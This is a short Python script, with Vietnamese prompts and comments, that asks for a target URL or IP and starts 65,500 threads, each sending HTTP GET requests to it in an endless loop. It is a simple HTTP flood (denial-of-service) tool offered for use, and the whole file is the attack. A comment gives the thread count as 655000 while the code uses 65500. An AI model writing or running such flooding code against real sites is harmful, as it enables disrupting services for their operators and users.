import threading
import requests

url = input("Nhập URL hoặc IP: ")

def send_request():
    while True:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print("Yêu cầu thành công!")
        except requests.exceptions.RequestException as e:
            print("Lỗi:", e)

# Tạo và bắt đầu 655000 thread
for _ in range(65500):
    thread = threading.Thread(target=send_request)
    thread.start()
